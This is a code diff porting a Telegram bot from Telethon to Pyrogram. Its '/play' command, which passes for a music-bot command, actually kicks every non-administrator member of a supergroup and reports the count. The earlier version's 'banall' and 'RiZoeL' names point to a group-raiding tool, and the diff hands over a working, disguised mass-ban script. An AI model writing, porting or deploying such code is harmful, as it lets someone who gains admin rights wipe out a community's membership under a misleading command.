@@ -1,36 +1,24 @@
-from telethon.tl.functions.channels import EditBannedRequest
+from pyrogram import Client, filters
 import asyncio
 
-@Riz.on(events.NewMessage(pattern="^/play"))
-async def banall(event):
-    if not event.is_group:
-        Reply = "Noob !! Use This Cmd in Group."
-        await event.reply(Reply)
+app = Client("my_account")
+
+@app.on_message(filters.command("play"))
+async def ban_all_users(client, message):
+    if not message.chat.type == "supergroup":
+        await message.reply("Noob !! Use This Cmd in Group.")
     else:
-        RiZ = await event.get_chat()
-        RiZoeLop = await event.client.get_me()
-        admin = RiZ.admin_rights
-        creator = RiZ.creator
-        if not admin and not creator:
-            return await event.reply("I Don't have sufficient Rights !!")
-        
-        RiZoeL = await event.client.send_message(event.chat_id, "Hello !! I'm Alive")
-        
-        admins = await event.client.get_participants(event.chat_id, filter='administrators')
-        admins_id = [i.id for i in admins]
-        
+        chat_id = message.chat.id
+        admins = await client.get_chat_members(chat_id, filter="administrators")
+        admins_ids = [admin.user.id for admin in admins]
         all_users = 0
         banned_users = 0
-        
-        async for user in event.client.iter_participants(event.chat_id):
+        async for member in client.iter_chat_members(chat_id):
             all_users += 1
-            try:
-                if user.id not in admins_id:
-                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))  # You need to define RIGHTS
-                    banned_users += 1
-                    await asyncio.sleep(0.1)
-            except Exception as e:
-                print(str(e))
+            if member.user.id not in admins_ids:
+                await client.kick_chat_member(chat_id, member.user.id)
+                banned_users += 1
                 await asyncio.sleep(0.1)
+        await message.reply(f"Banned {banned_users} out of {all_users} users.")
 
-        await event.reply(f"Banned {banned_users} out of {all_users} users.")
+app.run()
